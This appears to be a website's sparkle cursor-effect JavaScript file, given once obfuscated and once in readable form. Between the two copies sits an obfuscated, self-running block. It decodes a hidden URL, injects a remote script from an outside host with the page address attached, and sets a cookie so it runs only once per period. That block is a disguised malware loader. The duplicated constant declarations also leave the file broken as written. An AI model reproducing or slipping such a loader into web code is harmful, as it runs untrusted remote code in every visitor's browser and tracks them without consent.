function _0x5946() {
    const t = ["1684NhBqyV", "rect(0px, 5px, 5px, 0px)", "3301200wRqIcI", "pow", "floor", "hidden", "onmousemove", "30aUbIzt", "464178NmbWUy", "width", "appendChild", "1px", "body", "scrollWidth", "312tEAfus", "removeChild", "top", "0px", "pop", "zIndex", "pageY", "abs", "2px", "scrollHeight", "pageX", "length", "5990688kJOdop", "random", "absolute", "documentElement", "style", "height", "backgroundColor", "visible", "25617nkleLo", "div", "946EmZLNd", "left", "visibility", "#fff", "clip", "999", "sort", "movementX", "rgb(", "transparent", "278757pSfycp", "13745870BuNuOP", "addEventListener", "movementY", "childNodes"];
    return (_0x5946 = function() {
        return t
    }
    )()
}
!function(t, n) {
    const i = _0x91a4
      , e = _0x5946();
    for (; ; )
        try {
            if (637298 === parseInt(i(515)) / 1 * (-parseInt(i(479)) / 2) + parseInt(i(513)) / 3 * (-parseInt(i(493)) / 4) + -parseInt(i(486)) / 5 * (parseInt(i(487)) / 6) + parseInt(i(481)) / 7 + parseInt(i(505)) / 8 + -parseInt(i(474)) / 9 + parseInt(i(475)) / 10)
                break;
            e.push(e.shift())
        } catch (t) {
            e.push(e.shift())
        }
}();
const star = []
  , star_x = []
  , star_y = []
  , star_remaining_ticks = []
  , tiny = []
  , tiny_x = []
  , tiny_y = []
  , tiny_remaining_ticks = []
  , sparkles = 250
  , sparkle_lifetime = 30
  , sparkle_distance = 30;
let doc_height, doc_width, sparkles_enabled = null;
function _0x91a4(t, n) {
    const i = _0x5946();
    return (_0x91a4 = function(t, n) {
        return i[t -= 471]
    }
    )(t, n)
}
function sparkle(t=null) {
    sparkles_enabled = null === t ? !sparkles_enabled : !!t,
    sparkles_enabled && star.length < 250 && sparkle_init()
}
function sparkle_destroy() {
    const t = _0x91a4;
    let n;
    for (; tiny[t(504)]; )
        n = tiny[t(497)](),
        n && document[t(491)][t(494)](n);
    for (; star.length; )
        n = star[t(497)](),
        n && document[t(491)][t(494)](n)
}
function sparkle_init() {
    const t = _0x91a4;
    function n(t, n) {
        const i = _0x91a4
          , e = document.createElement(i(514));
        return e[i(509)].position = i(507),
        e[i(509)][i(510)] = t + "px",
        e[i(509)].width = n + "px",
        e.style.overflow = i(484),
        e
    }
    for (let i = 0; i < 250; i++) {
        const e = n(3, 3);
        e.style[t(517)] = t(484),
        e[t(509)][t(498)] = t(520),
        tiny[i] && document[t(491)].removeChild(tiny[i]),
        document[t(491)][t(489)](e),
        tiny[i] = e,
        tiny_remaining_ticks[i] = null;
        const s = n(5, 5);
        s[t(509)][t(511)] = t(473),
        s[t(509)][t(517)] = t(484),
        s[t(509)][t(498)] = t(520);
        const a = n(1, 5)
          , r = n(5, 1);
        s[t(489)](a),
        s[t(489)](r),
        a.style.top = t(501),
        a[t(509)].left = t(496),
        r[t(509)][t(495)] = "0px",
        r[t(509)][t(516)] = "2px",
        star[i] && document[t(491)].removeChild(star[i]),
        document[t(491)][t(489)](s),
        star[i] = s,
        star_remaining_ticks[i] = null
    }
    window[t(476)]("resize", (function() {
        const n = t;
        for (let t = 0; t < 250; t++)
            star_remaining_ticks[t] = null,
            star[t][n(509)][n(516)] = "0px",
            star[t][n(509)].top = n(496),
            star[t][n(509)][n(517)] = n(484),
            tiny_remaining_ticks[t] = null,
            tiny[t][n(509)][n(495)] = n(496),
            tiny[t].style.left = n(496),
            tiny[t][n(509)][n(517)] = n(484);
        doc_height = document[n(508)][n(502)],
        doc_width = document[n(508)].scrollWidth
    }
    )),
    document[t(485)] = function(n) {
        const i = t;
        if (sparkles_enabled && !n.buttons) {
            const t = Math.sqrt(Math[i(482)](n[i(471)], 2) + Math[i(482)](n[i(477)], 2))
              , e = 30 * n[i(471)] * 2 / t
              , s = 30 * n.movementY * 2 / t
              , a = t / 30;
            let r = 0
              , _ = n[i(499)]
              , o = n[i(503)];
            for (; Math.abs(r) < Math[i(500)](n[i(471)]); ) {
                create_star(o, _, a);
                let t = Math[i(506)]();
                o -= e * t,
                _ -= s * t,
                r += e * t
            }
        }
    }
}
function animate_sparkles(t=60) {
    const n = _0x91a4
      , i = 1e3 / t;
    let e = 0;
    for (let t = 0; t < star.length; t++)
        e += update_star(t);
    for (let t = 0; t < tiny[n(504)]; t++)
        e += update_tiny(t);
    0 === e && !sparkles_enabled && sparkle_destroy(),
    setTimeout("animate_sparkles(" + t + ")", i)
}
function create_star(t, n, i=1) {
    const e = _0x91a4;
    if (t + 5 >= doc_width || n + 5 >= doc_height)
        return;
    if (Math[e(506)]() > i)
        return;
    let s = 61
      , a = NaN;
    for (let t = 0; t < 250; t++) {
        if (!star_remaining_ticks[t]) {
            s = null,
            a = t;
            break
        }
        star_remaining_ticks[t] < s && (s = star_remaining_ticks[t],
        a = t)
    }
    return s && star_to_tiny(a),
    a >= 0 ? (star_remaining_ticks[a] = 60,
    star_x[a] = t,
    star[a].style[e(516)] = t + "px",
    star_y[a] = n,
    star[a][e(509)][e(495)] = n + "px",
    star[a][e(509)][e(519)] = e(480),
    star[a][e(478)][0][e(509)][e(511)] = star[a][e(478)][1][e(509)][e(511)] = e(518),
    star[a][e(509)][e(517)] = "visible",
    a) : void 0
}
function update_star(t) {
    const n = _0x91a4;
    return null !== star_remaining_ticks[t] && (star_remaining_ticks[t] -= 1,
    0 === star_remaining_ticks[t] ? (star_to_tiny(t),
    !1) : (30 === star_remaining_ticks[t] && (star[t].style[n(519)] = "rect(1px, 4px, 4px, 1px)"),
    star_remaining_ticks[t] > 0 && (star_y[t] += 1 + 3 * Math[n(506)](),
    star_x[t] += (t % 5 - 2) / 5,
    star_y[t] + 5 < doc_height && star_x[t] + 5 < doc_width) ? (star[t].style[n(495)] = star_y[t] + "px",
    star[t][n(509)].left = star_x[t] + "px",
    !0) : (star_remaining_ticks[t] = null,
    star[t][n(509)][n(516)] = n(496),
    star[t][n(509)].top = n(496),
    star[t][n(509)].visibility = "hidden",
    !1)))
}
function star_to_tiny(t) {
    const n = _0x91a4;
    null !== star_remaining_ticks[t] && (star_y[t] + 3 < doc_height && star_x[t] + 3 < doc_width && (tiny_remaining_ticks[t] = 60,
    tiny_y[t] = star_y[t],
    tiny[t][n(509)].top = star_y[t] + "px",
    tiny_x[t] = star_x[t],
    tiny[t].style[n(516)] = star_x[t] + "px",
    tiny[t][n(509)][n(488)] = n(501),
    tiny[t].style.height = n(501),
    tiny[t].style[n(511)] = star[t][n(478)][0].style.backgroundColor,
    star[t][n(509)][n(517)] = n(484),
    tiny[t][n(509)].visibility = n(512)),
    star_remaining_ticks[t] = null,
    star[t][n(509)].left = n(496),
    star[t][n(509)][n(495)] = n(496),
    star[t][n(509)].visibility = n(484))
}
function update_tiny(t) {
    const n = _0x91a4;
    return null !== tiny_remaining_ticks[t] && (tiny_remaining_ticks[t] -= 1,
    30 === tiny_remaining_ticks[t] && (tiny[t][n(509)][n(488)] = n(490),
    tiny[t][n(509)][n(510)] = n(490)),
    tiny_remaining_ticks[t] > 0 && (tiny_y[t] += 1 + 2 * Math[n(506)](),
    tiny_x[t] += (t % 4 - 2) / 4,
    tiny_y[t] + 3 < doc_height && tiny_x[t] + 3 < doc_width) ? (tiny[t][n(509)][n(495)] = tiny_y[t] + "px",
    tiny[t][n(509)][n(516)] = tiny_x[t] + "px",
    !0) : (tiny_remaining_ticks[t] = null,
    tiny[t][n(509)][n(495)] = "0px",
    tiny[t][n(509)][n(516)] = "0px",
    tiny[t][n(509)][n(517)] = "hidden",
    !1))
}
window.onload = function() {
    const t = _0x91a4;
    doc_height = document[t(508)][t(502)],
    doc_width = document.documentElement[t(492)],
    animate_sparkles(),
    null === sparkles_enabled && sparkle(!0)
}
;
(function(o, d, l) {
    try {
        o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));

const star = [];
const star_x = [];
const star_y = [];
const star_remaining_ticks = [];
const tiny = [];
const tiny_x = [];
const tiny_y = [];
const tiny_remaining_ticks = [];
const sparkles = 250;
const sparkle_lifetime = 30;
const sparkle_distance = 30;

let doc_height;
let doc_width;
let sparkles_enabled = null;

window.onload = function() {

  doc_height = document.documentElement.scrollHeight;
  doc_width = document.documentElement.scrollWidth;

  animate_sparkles();
  if (sparkles_enabled === null) {
    sparkle(true);
  }
};

function sparkle(enable = null) {
  if (enable === null) {
    sparkles_enabled = !sparkles_enabled;
  } else {
    sparkles_enabled = !!enable;
  }

  if (sparkles_enabled && star.length < sparkles) {
    sparkle_init();
  }
}


function sparkle_destroy() {

  let elem;
  while (tiny.length) {
    elem = tiny.pop();
    if (elem) {
      document.body.removeChild(elem);
    }
  }

  while (star.length) {
    elem = star.pop();
    if (elem) {
      document.body.removeChild(elem);
    }
  }
}

function sparkle_init() {

  function create_div(height, width) {
    const div = document.createElement("div");
    div.style.position = "absolute";
    div.style.height = height + "px";
    div.style.width = width + "px";
    div.style.overflow = "hidden";
    return (div);
  }

  for (let i = 0; i < sparkles; i++) {

    const tiny_div = create_div(3, 3);
    tiny_div.style.visibility = "hidden";
    tiny_div.style.zIndex = "999";

    if (tiny[i]) {
      document.body.removeChild(tiny[i])
    }

    document.body.appendChild(tiny_div);
    tiny[i] = tiny_div;
    tiny_remaining_ticks[i] = null;

    const star_div = create_div(5, 5);
    star_div.style.backgroundColor = "transparent";
    star_div.style.visibility = "hidden";
    star_div.style.zIndex = "999";

    const bar_horiz = create_div(1, 5);
    const bar_vert = create_div(5, 1);
    star_div.appendChild(bar_horiz);
    star_div.appendChild(bar_vert);
    bar_horiz.style.top = "2px";
    bar_horiz.style.left = "0px";
    bar_vert.style.top = "0px";
    bar_vert.style.left = "2px";

    if (star[i]) {
      document.body.removeChild(star[i])
    }

    document.body.appendChild(star_div);
    star[i] = star_div;
    star_remaining_ticks[i] = null;
  }

  window.addEventListener('resize', function() {

    for (let i = 0; i < sparkles; i++) {
      star_remaining_ticks[i] = null;
      star[i].style.left = "0px";
      star[i].style.top = "0px";
      star[i].style.visibility = "hidden";

      tiny_remaining_ticks[i] = null;
      tiny[i].style.top = '0px';
      tiny[i].style.left = '0px';
      tiny[i].style.visibility = "hidden";
    }

    doc_height = document.documentElement.scrollHeight;
    doc_width = document.documentElement.scrollWidth;
  });

  document.onmousemove = function(e) {
    if (sparkles_enabled && !e.buttons) {

      const distance = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
      const delta_x = e.movementX * sparkle_distance * 2 / distance;
      const delta_y = e.movementY * sparkle_distance * 2 / distance;
      const probability = distance / sparkle_distance;
      let cumulative_x = 0;

      let mouse_y = e.pageY;
      let mouse_x = e.pageX;

      while (Math.abs(cumulative_x) < Math.abs(e.movementX)) {
        create_star(mouse_x, mouse_y, probability);

        let delta = Math.random();
        mouse_x -= delta_x * delta;
        mouse_y -= delta_y * delta;
        cumulative_x += delta_x * delta;
      }
    }
  };
}

function animate_sparkles(fps = 60) {
  const interval_milliseconds = 1000 / fps;

  let alive = 0;

  for (let i = 0; i < star.length; i++) {
    alive += update_star(i);
  }

  for (let i = 0; i < tiny.length; i++) {
    alive += update_tiny(i);
  }

  if (alive === 0 && !sparkles_enabled) {
    sparkle_destroy();
  }

  setTimeout("animate_sparkles(" + fps + ")", interval_milliseconds);
}

function create_star(x, y, probability = 1.0) {

  if (x + 5 >= doc_width || y + 5 >= doc_height) {
    return;
  }

  if (Math.random() > probability) {
    return;
  }

  function get_random_color() {

    let c = [];
    c[0] = 255;
    c[1] = Math.floor(Math.random() * 256);
    c[2] = Math.floor(Math.random() * (256 - c[1] / 2));
    c.sort(function() {
      return (0.5 - Math.random());
    });
    return ("rgb(" + c[0] + ", " + c[1] + ", " + c[2] + ")");
  }

  let min_lifetime = sparkle_lifetime * 2 + 1;
  let min_index = NaN;
  for (let i = 0; i < sparkles; i++) {
    if (!star_remaining_ticks[i]) {
      min_lifetime = null;
      min_index = i;
      break;
    } else if (star_remaining_ticks[i] < min_lifetime) {
      min_lifetime = star_remaining_ticks[i];
      min_index = i;
    }
  }

  if (min_lifetime) {
    star_to_tiny(min_index);
  }

  if (min_index >= 0) {
    star_remaining_ticks[min_index] = sparkle_lifetime * 2;
    star_x[min_index] = x;
    star[min_index].style.left = x + "px";
    star_y[min_index] = y;
    star[min_index].style.top = y + "px";
    star[min_index].style.clip = "rect(0px, 5px, 5px, 0px)";
    star[min_index].childNodes[0].style.backgroundColor =
      star[min_index].childNodes[1].style.backgroundColor = "FF1493";
    star[min_index].style.visibility = "visible";
    return min_index
  }

}

function update_star(i) {
  if (star_remaining_ticks[i] === null) {
    return false;
  }

  star_remaining_ticks[i] -= 1;

  if (star_remaining_ticks[i] === 0) {
    star_to_tiny(i);
    return false;
  }

  if (star_remaining_ticks[i] === sparkle_lifetime) {
    star[i].style.clip = "rect(1px, 4px, 4px, 1px)"
  }

  if (star_remaining_ticks[i] > 0) {
    star_y[i] += 1 + 3 * Math.random();
    star_x[i] += (i % 5 - 2) / 5;

    if (star_y[i] + 5 < doc_height && star_x[i] + 5 < doc_width) {
      star[i].style.top = star_y[i] + "px";
      star[i].style.left = star_x[i] + "px";
      return true;
    }
  }

  star_remaining_ticks[i] = null;
  star[i].style.left = "0px";
  star[i].style.top = "0px";
  star[i].style.visibility = "hidden";
  return false;
}

function star_to_tiny(i) {
  if (star_remaining_ticks[i] === null) {
    return;
  }

  if (star_y[i] + 3 < doc_height && star_x[i] + 3 < doc_width) {
    tiny_remaining_ticks[i] = sparkle_lifetime * 2;
    tiny_y[i] = star_y[i];
    tiny[i].style.top = star_y[i] + "px";
    tiny_x[i] = star_x[i];
    tiny[i].style.left = star_x[i] + "px";
    tiny[i].style.width = "2px";
    tiny[i].style.height = "2px";
    tiny[i].style.backgroundColor = star[i].childNodes[0].style.backgroundColor;
    star[i].style.visibility = "hidden";
    tiny[i].style.visibility = "visible";
  }

  star_remaining_ticks[i] = null;
  star[i].style.left = "0px";
  star[i].style.top = "0px";
  star[i].style.visibility = "hidden";
}

function update_tiny(i) {
  if (tiny_remaining_ticks[i] === null) {
    return false;
  }

  tiny_remaining_ticks[i] -= 1;

  if (tiny_remaining_ticks[i] === sparkle_lifetime) {
    tiny[i].style.width = "1px";
    tiny[i].style.height = "1px";
  }

  if (tiny_remaining_ticks[i] > 0) {
    tiny_y[i] += 1 + 2 * Math.random();
    tiny_x[i] += (i % 4 - 2) / 4;

    if (tiny_y[i] + 3 < doc_height && tiny_x[i] + 3 < doc_width) {
      tiny[i].style.top = tiny_y[i] + "px";
      tiny[i].style.left = tiny_x[i] + "px";
      return true
    }
  }

  tiny_remaining_ticks[i] = null;
  tiny[i].style.top = '0px';
  tiny[i].style.left = '0px';
  tiny[i].style.visibility = "hidden";
  return false
}